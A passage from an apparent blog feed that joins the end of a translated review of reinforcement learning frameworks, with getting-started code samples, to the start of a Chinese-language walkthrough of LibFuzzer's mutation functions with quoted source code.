RL algorithms, i.e. those that don’t use models. E.g. entropy, bandits, simple MDPs, SARSA, some tabular methods, etc. And the reason for this is that you don’t need a DL framework for these models. So in summary, I think the level of abstraction is spot on. But the benefits/problems of limiting yourself to a DL framework remain. Note that this is based upon version 0.4.3 and a major rewrite is underway. Getting StartedThe getting started example is sensible. We’re creating an environment, an agent and a runner (the thing that actually does the training). The specifications for the agent is a little different though. It reminds me of the Dopamine Gin config, except it’s using standard json. In the example I’m getting those specifications from their examples directory, but you can imagine how easy it would be to run a hyperparameter search using them. 123456789101112131415161718192021222324252627282930313233343536373839environment = OpenAIGym( gym_id="CartPole-v0", monitor=".", monitor_safe=False, monitor_video=10, visualize=True)with urllib.request.urlopen("https://raw.githubusercontent.com/tensorforce/tensorforce/master/examples/configs/dqn.json") as url: agent = json.loads(url.read().decode()) print(agent)with urllib.request.urlopen("https://raw.githubusercontent.com/tensorforce/tensorforce/master/examples/configs/mlp2_network.json") as url: network = json.loads(url.read().decode()) print(network)agent = Agent.from_spec( spec=agent, kwargs=dict( states=environment.states, actions=environment.actions, network=network ))runner = Runner( agent=agent, environment=environment, repeat_actions=1)runner.run( num_timesteps=200, num_episodes=200, max_episode_timesteps=200, deterministic=True, testing=False, sleep=None)runner.close() Facebook Horizon Horizon is a framework from Facebook that is dominated by PyTorch. Another DL focused library then. Also: The main use case of Horizon is to train RL models in the batch setting. &hellip; Specifically, we try to learn the best possible policy given the input data. So like other frameworks the focus is off-policy, model driven RL with DL in the model. But this is differentiated due to the use of PyTorch. You could also compare this to Keras-RL using PyTorch as the backend for Keras. I’ve already discussed the cons of such a focused framework in the Tensorforce section, so I won’t state them again. There are several interesting differences though. There is no tight Gym integration. Instead they intentionally decouple the two by dumping Gym data into JSON, then reading the JSON back into the agent. This might sound verbose, but is actually really good for decoupling and therefore more scalable, less fragile and more flexible. The downside is that there are more hoops to jump through due to the increased complexity. However, as inconceivable as it sounds, there is no pip installer for Horizon. You have to use conda, install onnx, install java, setup the JAVA_HOME to point to conda, install Spark, install Gym (fair enough), install Apache thrift and then build Horizon. Wow. (Bonus points if you counted how many steps that was). So I think it suffice to say that I’m not going to attempt to install this in the demo Notebook. Getting StartedYou’ll need a lot of time and a lot of patience. Follow the build instructions, then follow the training guide. I can’t vouch for it because I have a life to get on with. Nervana Systems Coach The first thing you will notice when you look at this framework is the number of implemented algorithms. It is colossal and must have taken several people many weeks to implement. The second thing you will notice is the number of integrated Environments. Considering how much time this must have taken, it gives a lot of hope for the rest of the framework. It comes with a dedicated dashboard which looks pretty nice. Most of the other frameworks rely on the Tensorboard project. One particular wow feature that I haven’t seen before, is inbuilt deployment for Kubernetes. I think that the orchestration of Coach by Coach is a step too far, but the fact that they’ve even thought about it means that it is probably scalable enough to deploy onto Kuberentes with standard tooling. The level of modularity is astounding. For example there are classes that implement all sorts of exploration strategies and allow you to make all sorts of changes to the various model designs. The ONLY thing that I can think of that is a little annoying is the same limitation of forcing me to use DL as the model. I remain convinced that a subset of simpler applications do not require anything nearly as complex as DL and could benefit for more traditional Regression methods. However, I’m sure it should be reasonably easy to add in a little stub class that removes the DL stuff. Interestingly, the framework supports Tensorflow and MXNet due to it’s use of Keras. This means that PyTorch is not supported, because Keras doesn’t support PyTorch. Frankly, I can’t understand why this framework is so unpopular in any way of measuring it. In terms of stars. In terms of the number of google pages (the answer is 7, if you are wondering). Compare that to Google Dopamine for example, with 16500 pages. It is certainly the most comprehensive framework with the best documentation and a fantastic level of modularity. They’ve even got a ❤️ Getting Started Notebook ❤️. Getting StartedThere are two important notes I’d like to point out. First, make sure you are looking at a tagged version of the documentation or the demos. There are some new features in the master branch that don’t work with a pip installed version. Second, it depends on OpenAI Gym version 0.12.5, which isn’t installed in colab. You’ll need to run !pip install gym==0.12.5 and restart the runtime. 12345678910111213141516171819202122232425import tensorflow as tftf.reset_default_graph() # So that we don't get an error for TF when we re-runfrom rl_coach.agents.clipped_ppo_agent import ClippedPPOAgentParametersfrom rl_coach.environments.gym_environment import GymVectorEnvironmentfrom rl_coach.graph_managers.basic_rl_graph_manager import BasicRLGraphManagerfrom rl_coach.graph_managers.graph_manager import ScheduleParametersfrom rl_coach.core_types import TrainingSteps, EnvironmentEpisodes, EnvironmentStepsfrom rl_coach.base_parameters import VisualizationParametersglobal experiment_path; experiment_path = '.' # Because of some bizzare global in the mp4 dumping code# Custom schedule to speed up training. We don't really care about the results.schedule_params = ScheduleParameters()schedule_params.improve_steps = TrainingSteps(200)schedule_params.steps_between_evaluation_periods = EnvironmentSteps(200)schedule_params.evaluation_steps = EnvironmentEpisodes(10)schedule_params.heatup_steps = EnvironmentSteps(0)graph_manager = BasicRLGraphManager( agent_params=ClippedPPOAgentParameters(), env_params=GymVectorEnvironment(level='CartPole-v0'), schedule_params=schedule_params, vis_params=VisualizationParameters(dump_mp4=True) # So we can dump the video) MAgent MAgent is a framework that allows you to solve many-agent RL problems. This is a completely different aim compared to all the other “traditional” RL frameworks that use only a single or very few agents. They claim it can scale up to millions of agents. But again, no pip installer. Please, everyone, create pip installers for you projects. It’s vitally important for ease of use and therefore project traction. I guess it’s because the whole project is written in C, presumably for performance reasons. It’s using Tensorflow under the hood and builds its own gridworld-like enironment. The Agents are designed with “real-life” simulations in mind. For example you can specify the size of the agent, how far it can see; things like that. The observations that are passed to the Agents are grids. The actions that they can take are limited to moving, attacking and turning. They are rewarded according to a flexible rule definition. In short, the framework is setup to handle game of life style games out of the box, with some extra modularity on how the agents behave and are rewarded. Due to this we can use some of the more advanced DL methods to train the agents to perform complex, coordinated tasks. Like surround prey so that it can’t move. You can learn more in the getting started guide. I am very impressed with the idea. But as you can see from the Github stats above, 4 commits a year basically means that it is hardly being used. The last major updates were in 2017. This is a shame, because it represents something very different compared to the other frameworks. It would be great if someone could make it easier to use, or replicate the framework in idiomatic Python, so that it becomes easier to use. Getting StartedSo I almost got it working in the Notebook. I tried a few examples from the getting started guide. The training version takes hours, so I bailed on that quite quickly. The examples/api_demo.py however is just testing the learnt models, so that is lightning quick. However, it renders the environment in some proprietary text format. You need to run a random webserver binary that parses and hosts the render in the browser. Because we’re in colab, it doesn’t allow you to run a webserver. So I tried downloading the files, but we built the binaries on colab, not on a mac, so I wasn’t able to run the binary. So that was a bit frustrating. It would have been much simpler if it had just rendered it in some standard format like mp4 of a gif or something. And also disappointing, because I was looking forward to generating some complex behavior. But just so you are not disappointed, here is some eye candy from the author. Please excuse the audio! And here are the remains of the code that worked: 123456!git clone https://github.com/geek-ai/MAgent.git!sudo apt-get install cmake libboost-system-dev libjsoncpp-dev libwebsocketpp-dev%cd MAgent!bash build.sh!PYTHONPATH=$(pwd)/python:$PYTHONPATH python examples/api_demo.py You can exchange that last call to any of the python files in teh examples folder. TF-Agents Tensorflow-Agents (TF-Agents) is another NOGP from Google with the focus squarely on Tensorflow. So treat this as direct competition to TRFL, Tensorforce and Dopamine. Which begs the question: why have more Google employees created another Tensorflow-abstraction-for-RL when TRFL and Dopamine already exist? In an issue discussing the relationship between TF-Agents and Dopamine the contributors suggest that: it seems that Dopamine and TF-Agent strongly overlap. Although dopamine aims at being used for fast prototyping and benchmarking as the reproducibility has been put at the core of the project, whereas TF-Agent would be more used for production-level reinforcement learning algorithms. To be honest, I’m not sure what “production-level” means at this point. There are some great colab examples, but there is no documentation. And you certainly shouldn’t be using Notebooks in production. Once you start digging into the examples, then it becomes clear that the code is very Tensorflow heavy. For example, the simple Cartpole example has a lot of lines of code. Mainly because there is a lot of explanation and debuging code in there, but it looks like a sign of things to come. I must admit though, the code does look very nice. It’s nicely separated and the modularity looks good. All the abstractions you would expect are there. The only thing I want to pick on is the Agent abstraction. This is the base class and it is directly coupled to Tensorflow. It is a Tensorflow module. This adds a significant amount of complexity and I wish that it was abstracted away so I didn’t have to worry about it until I need it. The same is true for the vast majority of other abstractions; they are all Tensorflow modules. With that said, it is clear that this is a far more serious and capable library than TRFL. Getting StartedThere is already an extensive set of Notebooks available in their repository, so I won’t waste time just copy and pasting here. You can also run them directly in colab too. The video below shows three episodes of the cartpole. To me it looks like it is having a fit. Constant nudges to rebalance. SLM-Lab SLM-Lab is modular RL framework based upon PyTorch. It appears to be aimed more towards researchers. They stress the importance of modularity, but rightly state that being simple and modular is probably not possible; it is a compromise between the two. Interestingly it also uses the Ray project under the hood to make it scalable. Despite starting in 2017, the small number of contributors and the relative popularity in terms of github stars, there is lots of activity. The vast majority of the commits are one-liners, but the commitment by the authors is amazing. Unfortunately this is another non-pip install framework and attempts to install a whole load of build related C libraries and miniconda. Which is problematic in colab. Being a good Engineer I ignored all the documentation and tried to get it working myself through trial and error. It almost worked, but I stumbled across a problem when initialising pytorch that I didn’t know how to fix. So unfortunately, again, you will have to settle for an example image from the authors. I struggled a bit with the documentation. The architecture documentation is limited and the rest is focused towards usage. But by usage I mean running experiments on current implementations. I struggled to find the documentation that told me how to plug modules together in different ways. I presume they intend that this should be done via the JSON spec files. Indeed the original motivation was: There was a need for a framework that would allow us to compare algorithms and environments, quickly set up experiments to test hypotheses, reuse components, analyze and compare results, log results. So the goal here is to allow reuse via configuration, much like Dopamine and Tensorforce. This “RL as configuration” seems to be a theme! However, I’m not convinced. I would argue that code is more idiomatic, more flexible. It is what people are used to. Every time you do something via configuration that is another Domain Specific Language (DSL) that users have to learn. And because that DSL is generally static (Gin is not) then the implementation of the DSL sets the limitation. It is never going to suit everyone because there will be an edge case that isn’t covered by the DSL. DeeR The initial impression of DeeR is a good one. It has a pip installer. It waxes lyrical about modularity. It has only two Python dependencies; numpy and Joblib. So no nasty C make process to get it working, great! The documentation is clear, but is missing some overall architecture documentation. You have to dig into the classes/code to find the documentation. But when you do it is good. The “modules” are split mostly in the way you would expect. Modules for the Environment, Agent, and Policies. There is an interesting class called Controller which is not standard. This class provides lifecycle hooks that you can attach to; events like the end of an episode or whenever an action is taken. For example, if you wanted to do some logging at the end of an episode, then you could subclass this class and override the onEpisodeEnd. There are several example controllers, one of which is an EpsilonController. This allows you to dymaically alter the eta or epsilon value in e-greedy algorithms. This is quite powerful as it allows you to alter the learning process in mid flight. But from a Software Engineering perspective this is quite risky. Any Functional Programmer will tell you not to mutate the state of another object because “Dragons be here”. It would have been nicer if the API was more functional and you could pass in functions that computed, for example, the agent’s next eta, rather than mutating the state of the agent directly. This may make it slightly more complex, though. The framework also contains a few learning algorithms but it’s certainly not as comprehensive as something like Coach. Getting StartedThanks to the pip install and very few dependencies, this was probably the easiest framework to get up and running. 12!pip install git+git://github.com/VINF/deer.git@master!git clone https://github.com/VinF/deer.git I cloned the git repo so I could run the examples. Then it’s just a case of importing everything: 123456%cd /content/deer/examples/toy_envimport numpy as npfrom deer.agent import NeuralAgentfrom deer.learning_algos.q_net_keras import MyQNetworkfrom Toy_env import MyEnv as Toy_envimport deer.experiment.base_controllers as bc And stealing the example: 12345678910111213141516171819202122232425262728293031323334353637rng = np.random.RandomState(123456)# --- Instantiate environment ---env = Toy_env(rng)# --- Instantiate qnetwork ---qnetwork = MyQNetwork( environment=env, random_state=rng)# --- Instantiate agent ---agent = NeuralAgent( env, qnetwork, random_state=rng)# --- Bind controllers to the agent ---# Before every training epoch, we want to print a summary of the agent's epsilon, discount and# learning rate as well as the training epoch number.agent.attach(bc.VerboseController())# During training epochs, we want to train the agent after every action it takes.# Plus, we also want to display after each training episode (!= than after every training) the average bellman# residual and the average of the V values obtained during the last episode.agent.attach(bc.TrainerController())# All previous controllers control the agent during the epochs it goes through. However, we want to interleave a# "test epoch" between each training epoch. We do not want these test epoch to interfere with the training of the# agent. Therefore, we will disable these controllers for the whole duration of the test epochs interleaved this# way, using the controllersToDisable argument of the InterleavedTestEpochController. The value of this argument# is a list of the indexes of all controllers to disable, their index reflecting in which order they were added.agent.attach(bc.InterleavedTestEpochController( epoch_length=500, controllers_to_disable=[0, 1]))# --- Run the experiment ---agent.run(n_epochs=100, epoch_length=1000) Here we are instantiating an environment, creating the Q-Learning algorithm and creating the agent that uses that algorithm. Next we use the .attach() function on the agent to appen all of these Controllers we have been talking about. They add logging and interleave training periods and testing periods. If we wanted to edit any of this we just need to reimplement the piece that we’re interested in. Great! The only issue was that the toy example didn’t work! I’m not sure why, but it’s probably something silly. The training values looked a little weird in that the test score was always 0, and the training loss increased over time. Maybe it got stuck. Not sure. I’m sure it’s something silly. Garage Garage is a follow-on from rllab with the same aims, but just community, rather than individual support. The documentation is a little sparse. For instance, it doesn’t highlight that it implements a large number of algorithms. And also a huge number of policies. In fact, there’s pretty much everything you could ever need in this quiet little directory. But it is very tightly coupled to Tensorflow, if that is a problem for you. There’s so much functionality here, but it is completely hidden. The code is reasonably well documented, but it’s not exposed. You have to dig through it to find it. Again there is no pip installer. Just some custom conda install and some apt-get dependencies. So I can see that there is a huge amount of value in the algorithm implementations, but I’m going to skip the getting started this time. Surreal Surreal is a suite of applications. Foremost it is an RL framwork. But to make sure they don’t build just another framework, they also provide a new Robotics simulator, an orchestrator, a cloud infrastructure provisioner and a protocol for distributed computing. It comes from Stanford, hence academic in approach and use-case, hence the default use of PyTorch. I’m all for the framework and the simulator, but it would have been easier if they had just used standard industrial components for the orchestrator (Kubernetes), infrastructure (Terraform) and protocol (Kafka/Nats/etc/etc). Those problems have already been solved. (Correction haha. Once I dug into the getting started guide, it became clear that they are using Kubernetes and Terraform. Great choices! 😂) The robotics simulator is a collection of MuJoCo simulations. So that is a great addition to the Environment list (despite the licensing terms of MuJoCo). The RL framework needs a big of coaxing into life. It’s another combination of apt-get’s and conda installs. Oh wow. I’ve just noticed that they’ve disabled the Github issue tracker. And there’s an explict copyright notice that belongs to each of the authors. OK, so this isn’t even open source. But the robosuite is MIT licenced? Very strange. Stopping here due to the lack of issues and werid licensing. RLgraph So let’s start by saying RLgraph has a whopping number of commits. They’re running at 4000 commits per year. Compare that to OpenAI Gym at just 221. Somebody needs to tell these five people to have a holiday. And it’s only a year old. I can only imagine that it is being used full time. But anyway. Like other frameworks they are focusing on scalability. But interestingly they are mapping directly to both Tensorflow and Pytorch. They are not using Keras. So that must have been a massive challenge in itself. It looks like they’ve used the Ray project to distribute work like SLM-Lab. But hurray! They have a pip installer. The configuration of the agents is controlled via JSON. But only the configuration. Not the construction. I’ve just read that the authors also worked on Tensorforce, which explains some of the de ja voux I have been feeling. And I love that my complaints in Tensorforce, about how the underlying DL framework often leaks into the RL implementation code, have been addressed in RLgraph. I get the feeling that they’ve been listening to me rant to my bored wife. Separating spaces of tensors from logical composition enables us to reuse components without ever manually dealing with incompatible shapes again. Note how the above code does not contain any framework-specific notions but only defines an input dataflow from a set of spaces. Just want I always wanted. And this is achieved with an abstraction of inputs and outputs. Other than that, the API is familiar. An Environment and an Agent. There’s a very cool Component class that abstracts the DL building blocks. However, there are abstractions that are missing here. There’s no Policy abstractions. No exploration abstractions. Basically all the nice abstractions from Nervana Systems Coach. But I’m still pretty impressed. Getting StartedI altered the cartpole getting started example a little to use the SingleThreadedWorker and enable rendering on the environment to get the video output. Other than that it all looks very familiar. 123456789101112131415161718192021222324252627282930import numpy as npfrom rlgraph.agents import DQNAgentfrom rlgraph.environments import OpenAIGymEnvfrom rlgraph.execution import SingleThreadedWorkerenvironment = OpenAIGymEnv('CartPole-v0', monitor=".", monitor_video=1, visualize=True)# Create from .json file or dict, see agent API for all# possible configuration parameters.agent = DQNAgent.from_file( "configs/dqn_cartpole.json", state_space=environment.state_space, action_space=environment.action_space)episode_returns = []def episode_finished_callback(episode_return, duration, timesteps, **kwargs): episode_returns.append(episode_return) if len(episode_returns) % 10 == 0: print("Episode &#123;&#125; finished: reward=&#123;:.2f&#125;, average reward=&#123;:.2f&#125;.".format( len(episode_returns), episode_return, np.mean(episode_returns[-10:]) ))worker = SingleThreadedWorker(env_spec=lambda: environment, agent=agent, render=True, worker_executes_preprocessing=False, episode_finish_callback=episode_finished_callback)print("Starting workload, this will take some time for the agents to build.")# Use exploration is true for training, false for evaluation.worker.execute_timesteps(1000, use_exploration=True) Simple RL And finally, simple_rl. All other frameworks state that their goals are performance/scalability or modularity or repeatability. None of them set out to be simple. This is where simple_rl steps in. Built from the ground up to be as simple as possible. It only has two dependencies, numpy and matplotlib. And that’s only if you want to plot the results. Basically it’s just numpy. It has pip installer. The documentation is non-existant but that’s ok, who needs docs? ;-) It presents a familiar collection of abstractions: an agent, an experiment, an environment that is called an mdp. The framework also abstracts other parts of the model like an action, feature, state. And a planning class that implements the strategies for next actions. It is still very modular, but some of the naming convensions should be changed to match the other frameworks (standardisation). So it is becoming apparent that “simple” doesn’t necesarily mean easy to understand. Generally, more abstraction makes it harder to understand. Simple in this case is “ease of use”. I think that’s a shame. I really was hoping for simplicity in terms of undertanding. But it looks like it is aiming to compete with some of the more complex frameworks; Deep RL support with PyTorch is in development. There continues to be a gap in the framework market for a very simple, understandable RL framework. And I’m not sure why this framework has so few stars compared to the rest. Presumably because it’s not bootstrapping on the popularity of other DL frameworks, like many of the other frameworks. Getting StartedIt should have been simple. But deep inside the code there are a few lines that force the Matplotlib to use the TkAgg backend. I tried to get TkAgg working in the Notebook but could not. It is designed for graphical desktop use, so you can imagine that it is not straightforward. I created an issues here. It should be a simple fix. If/When it works, it should be as simple as something like: 1234567891011121314from simple_rl.agents import QLearningAgent, RandomAgent, RMaxAgentfrom simple_rl.tasks import GridWorldMDPfrom simple_rl.run_experiments import run_agents_on_mdp# Setup MDP.mdp = GridWorldMDP(width=4, height=3, init_loc=(1, 1), goal_locs=[(4, 3)], lava_locs=[(4, 2)], gamma=0.95, walls=[(2, 2)], slip_prob=0.05)# Setup Agents.ql_agent = QLearningAgent(actions=mdp.get_actions())rmax_agent = RMaxAgent(actions=mdp.get_actions())rand_agent = RandomAgent(actions=mdp.get_actions())# Run experiment and make plot.run_agents_on_mdp([ql_agent, rmax_agent, rand_agent], mdp, instances=5, episodes=50, steps=10) This trains a few different agents and produces a reward plot for each. Nice eh! The only thing I would suggest is that there shouldn’t be any environment implementation in simple_rl. That is out of scope. Leave that to Gym-like projects. For example, gym-minigrid has an awesome Gridworld implementation. Google RankingsGoogle’s Trends search tool allows you to find out what search queries are the most popular. Unfortunately they only provide relative measures and those change depending on what you are querying. Also, common words often get mixed into other queries. For example, searching for “Facebook Horizon” is mixed with a bunch of unrelated queries about “Forza Horizon 4” and “facebook log in”; clearly this inflates this score and cannot be trusted. I went through all of these frameworks and found that only two frameworks stood out, openai gym and google dopamine. But even for google dopamine, the related queries were google docs/scholar/translate/etc., so I’m not sure if I can trust this either. One of the things that stood out to me most was the geographical popularity. OpenAI Gym seemed to be the most popular search term, given that it has a high ranking score and all of the related queries are related to RL. But when you look at the how the ranking alters by geography, China is the country with the most searches. This strikes me as odd, because Google is banned in China and so how are they generating these statistics? Are users using VPNs and then searching, and Google is able to recognise that the original traffic is from China? Don’t Trust Google TrendsAll of this brings me to the conclusion that I can’t trust Google trends at all. OpenAI Gym does seem like the highest ranking RL related framework, which you might expect, but the bulk of that score is coming from China. But Google is blocked in China. Sooo.. 原文地址]]></content>
      <categories>
        <category>强化学习</category>
      </categories>
      <tags>
        <tag>外文翻译</tag>
        <tag>强化学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LibFuzzer中的变异策略分析]]></title>
    <url>%2F2019%2F12%2F11%2Flibfuzzer%E4%B8%AD%E7%9A%84%E5%8F%98%E5%BC%82%E7%AD%96%E7%95%A5%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[LibFuzzer是一个模糊测试引擎，是LLVM项目的一部分，在当前LLVM中默认被支持。目前llvm-project提供较为方便的编译方法。 简介LibFuzzer是LLVM项目中compiler-rt的一部分，在这里有其详细使用说明。其它使用说明包括Google的2篇文章libFuzzerTutorial和structure-aware-fuzzing，中文翻译分别对应这里和这里。本文将分析LibFuzzer的变异策略，其关键代码位于这里。 目前LibFuzzer位于LLVM项目中，因此其编译方法只需在创建Makefile的过程中指定compiler-rt即可：cmake -G &quot;Unix Makefiles&quot; -DLLVM_ENABLE_PROJECTS=&quot;clang;clang-tools-extra;compiler-rt&quot;。 在代码开始处可以看到Dispatcher中其用到的所有变异策略，共有15种，下面依次进行分析。 1234567891011121314151617181920212223242526272829303132333435MutationDispatcher::MutationDispatcher(Random &amp;Rand, const FuzzingOptions &amp;Options) : Rand(Rand), Options(Options) &#123; DefaultMutators.insert( DefaultMutators.begin(), &#123; &#123;&amp;MutationDispatcher::Mutate_EraseBytes, "EraseBytes"&#125;, &#123;&amp;MutationDispatcher::Mutate_InsertByte, "InsertByte"&#125;, &#123;&amp;MutationDispatcher::Mutate_InsertRepeatedBytes, "InsertRepeatedBytes"&#125;, &#123;&amp;MutationDispatcher::Mutate_ChangeByte, "ChangeByte"&#125;, &#123;&amp;MutationDispatcher::Mutate_ChangeBit, "ChangeBit"&#125;, &#123;&amp;MutationDispatcher::Mutate_ShuffleBytes, "ShuffleBytes"&#125;, &#123;&amp;MutationDispatcher::Mutate_ChangeASCIIInteger, "ChangeASCIIInt"&#125;, &#123;&amp;MutationDispatcher::Mutate_ChangeBinaryInteger, "ChangeBinInt"&#125;, &#123;&amp;MutationDispatcher::Mutate_CopyPart, "CopyPart"&#125;, &#123;&amp;MutationDispatcher::Mutate_CrossOver, "CrossOver"&#125;, &#123;&amp;MutationDispatcher::Mutate_AddWordFromManualDictionary, "ManualDict"&#125;, &#123;&amp;MutationDispatcher::Mutate_AddWordFromPersistentAutoDictionary, "PersAutoDict"&#125;, &#125;); if(Options.UseCmp) DefaultMutators.push_back( &#123;&amp;MutationDispatcher::Mutate_AddWordFromTORC, "CMP"&#125;); if (EF-&gt;LLVMFuzzerCustomMutator) Mutators.push_back(&#123;&amp;MutationDispatcher::Mutate_Custom, "Custom"&#125;); else Mutators = DefaultMutators; if (EF-&gt;LLVMFuzzerCustomCrossOver) Mutators.push_back( &#123;&amp;MutationDispatcher::Mutate_CustomCrossOver, "CustomCrossOver"&#125;);&#125; EraseBytes随机删除Data中的N个数据。 1234567891011size_t MutationDispatcher::Mutate_EraseBytes(uint8_t *Data, size_t Size, size_t MaxSize) &#123; if (Size &lt;= 1) return 0; size_t N = Rand(Size / 2) + 1; assert(N &lt; Size); size_t Idx = Rand(Size - N + 1); // Erase Data[Idx:Idx+N]. memmove(Data + Idx, Data + Idx + N, Size - Idx - N); // Printf("Erase: %zd %zd =&gt; %zd; Idx %zd\n", N, Size, Size - N, Idx); return Size - N;&#125; InsertByte在Data的一个随机位置插入一个随机字符。 123456789size_t MutationDispatcher::Mutate_InsertByte(uint8_t *Data, size_t Size, size_t MaxSize) &#123; if (Size &gt;= MaxSize) return 0; size_t Idx = Rand(Size + 1); // Insert new value at Data[Idx]. memmove(Data + Idx + 1, Data + Idx, Size - Idx); Data[Idx] = RandCh(Rand); return Size + 1;&#125; InsertRepeatedBytes在Data中的一个随机位置处连续插入N（至少3个）个相同的随机字符。 1234567891011121314151617size_t MutationDispatcher::Mutate_InsertRepeatedBytes(uint8_t *Data, size_t Size, size_t MaxSize) &#123; const size_t kMinBytesToInsert = 3; if (Size + kMinBytesToInsert &gt;= MaxSize) return 0; size_t MaxBytesToInsert = std::min(MaxSize - Size, (size_t)128); size_t N = Rand(MaxBytesToInsert - kMinBytesToInsert + 1) + kMinBytesToInsert; assert(Size + N &lt;= MaxSize &amp;&amp; N); size_t Idx = Rand(Size + 1); // Insert new values at Data[Idx]. memmove(Data + Idx + N, Data + Idx, Size - Idx); // Give preference to 0x00 and 0xff. uint8_t Byte = Rand.RandBool() ? Rand(256) : (Rand.RandBool() ? 0 : 255); for (size_t i = 0; i &lt; N; i++) Data[Idx + i] = Byte; return Size + N;&#125; ChangeByte将Data中一个随机位置处的内容修改为一个随机字符。 1234567size_t MutationDispatcher::Mutate_ChangeByte(uint8_t *Data, size_t Size, size_t MaxSize) &#123; if (Size &gt; MaxSize) return 0; size_t Idx = Rand(Size); Data[Idx] = RandCh(Rand); return Size;&#125; ChangeBit反转Data中一个随机位置处的数据的随机一位。 1234567size_t MutationDispatcher::Mutate_ChangeBit(uint8_t *Data, size_t Size, size_t MaxSize) &#123; if (Size &gt; MaxSize) return 0; size_t Idx = Rand(Size); Data[Idx] ^= 1 &lt;&lt; Rand(8); return Size;&#125; ShuffleBytes打乱Data中随机位置起[1,8]个随机数据的顺序，由std::shuffle实现。 12345678910size_t MutationDispatcher::Mutate_ShuffleBytes(uint8_t *Data, size_t Size, size_t MaxSize) &#123; if (Size &gt; MaxSize || Size == 0) return 0; size_t ShuffleAmount = Rand(std::min(Size, (size_t)8)) + 1; // [1,8] and &lt;= Size. size_t ShuffleStart = Rand(Size - ShuffleAmount); assert(ShuffleStart + ShuffleAmount &lt;= Size); std::shuffle(Data + ShuffleStart, Data + ShuffleStart + ShuffleAmount, Rand); return Size;&#125; ChangeASCIIInt在Data中寻找一段连续数字数据[B,E)，然后手动计算其数值并随机做一次计算（自增1，自减1，除以2，乘2，取小于其平方的随机数），并将新数值手动解析为字符串放入[B,E)中，不足补0，超出截断。 123456789101112131415161718192021222324252627282930313233size_t MutationDispatcher::Mutate_ChangeASCIIInteger(uint8_t *Data, size_t Size, size_t MaxSize) &#123; if (Size &gt; MaxSize) return 0; size_t B = Rand(Size); while (B &lt; Size &amp;&amp; !isdigit(Data[B])) B++; if (B == Size) return 0; size_t E = B; while (E &lt; Size &amp;&amp; isdigit(Data[E])) E++; assert(B &lt; E); // now we have digits in [B, E). // strtol and friends don't accept non-zero-teminated data, parse it manually. uint64_t Val = Data[B] - '0'; for (size_t i = B + 1; i &lt; E; i++) Val = Val * 10 + Data[i] - '0'; // Mutate the integer value. switch(Rand(5)) &#123; case 0: Val++; break; case 1: Val--; break; case 2: Val /= 2; break; case 3: Val *= 2; break; case 4: Val = Rand(Val * Val); break; default: assert(0); &#125; // Just replace the bytes with the new ones, don't bother moving bytes. for (size_t i = B; i &lt; E; i++) &#123; size_t Idx = E + B - i - 1; assert(Idx &gt;= B &amp;&amp; Idx &lt; E); Data[Idx] = (Val % 10) + '0'; Val /= 10; &#125; return Size;&#125; ChangeBinInt选Data中随机位置处的随机长度（8、4、2、1字节之一）数据，将Size（随机数据位于Data前64个位置中）或其自身的值随机变换后替换该处数据。 123456789101112131415161718192021222324252627282930313233343536373839404142434445size_t MutationDispatcher::Mutate_ChangeBinaryInteger(uint8_t *Data, size_t Size, size_t MaxSize) &#123; if (Size &gt; MaxSize) return 0; switch (Rand(4)) &#123; case 3: return ChangeBinaryInteger&lt;uint64_t&gt;(Data, Size, Rand); case 2: return ChangeBinaryInteger&lt;uint32_t&gt;(Data, Size, Rand); case 1: return ChangeBinaryInteger&lt;uint16_t&gt;(Data, Size, Rand); case 0: return ChangeBinaryInteger&lt;uint8_t&gt;(Data, Size, Rand); default: assert(0); &#125; return 0;&#125;template&lt;class T&gt;size_t ChangeBinaryInteger(uint8_t *Data, size_t Size, Random &amp;Rand) &#123; if (Size &lt; sizeof(T)) return 0; size_t Off = Rand(Size - sizeof(T) + 1); assert(Off + sizeof(T) &lt;= Size); T Val; if (Off &lt; 64 &amp;&amp; !Rand(4)) &#123; Val = Size; if (Rand.RandBool()) Val = Bswap(Val); &#125; else &#123; memcpy(&amp;Val, Data + Off, sizeof(Val)); T Add = Rand(21); Add -= 10; if (Rand.RandBool()) Val = Bswap(T(Bswap(Val) + Add)); // Add assuming different endiannes. else Val = Val + Add; // Add assuming current endiannes. if (Add == 0 || Rand.RandBool()) // Maybe negate. Val = -Val; &#125; memcpy(Data + Off, &amp;Val, sizeof(Val)); return Size;&#125;// compiler-rt/lib/fuzzer/FuzzerBuiltins.h// GNUinline uint8_t Bswap(uint8_t x) &#123; return x; &#125;inline uint16_t Bswap(uint16_t x) &#123; return __builtin_bswap16(x); &#125; // 按字节顺序翻转，0xaabb -&gt; 0xbbaainline uint32_t Bswap(uint32_t x) &#123; return __builtin_bswap32(x); &#125;inline uint64_t Bswap(uint64_t x) &#123; return __builtin_bswap64(x); &#125; CopyPart随机选择CopyPartOf或InsertPartOf，CopyPartOf将Data中随机位置的随即长度的数据拷贝到该位置前的随机位置处进行覆写，InsertPartOf将Data中随机位置的随机长度的数据插入到随机位置中（ToInsertPos数据后移）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// Overwrites part of To[0,ToSize) with a part of From[0,FromSize).// Returns ToSize.size_t MutationDispatcher::CopyPartOf(const uint8_t *From, size_t FromSize, uint8_t *To, size_t ToSize) &#123; // Copy From[FromBeg, FromBeg + CopySize) into To[ToBeg, ToBeg + CopySize). size_t ToBeg = Rand(ToSize); size_t CopySize = Rand(ToSize - ToBeg) + 1; assert(ToBeg + CopySize &lt;= ToSize); CopySize = std::min(CopySize, FromSize); size_t FromBeg = Rand(FromSize - CopySize + 1); assert(FromBeg + CopySize &lt;= FromSize); memmove(To + ToBeg, From + FromBeg, CopySize); return ToSize;&#125;// Inserts part of From[0,ToSize) into To.// Returns new size of To on success or 0 on failure.size_t MutationDispatcher::InsertPartOf(const uint8_t *From, size_t FromSize, uint8_t *To, size_t ToSize, size_t MaxToSize) &#123; if (ToSize &gt;= MaxToSize) return 0; size_t AvailableSpace = MaxToSize - ToSize; size_t MaxCopySize = std::min(AvailableSpace, FromSize); size_t CopySize = Rand(MaxCopySize) + 1; size_t FromBeg = Rand(FromSize - CopySize + 1); assert(FromBeg + CopySize &lt;= FromSize); size_t ToInsertPos = Rand(ToSize + 1); assert(ToInsertPos + CopySize &lt;= MaxToSize); size_t TailSize = ToSize - ToInsertPos; if (To == From) &#123; MutateInPlaceHere.resize(MaxToSize); memcpy(MutateInPlaceHere.data(), From + FromBeg, CopySize); memmove(To + ToInsertPos + CopySize, To + ToInsertPos, TailSize); memmove(To + ToInsertPos, MutateInPlaceHere.data(), CopySize); &#125; else &#123; 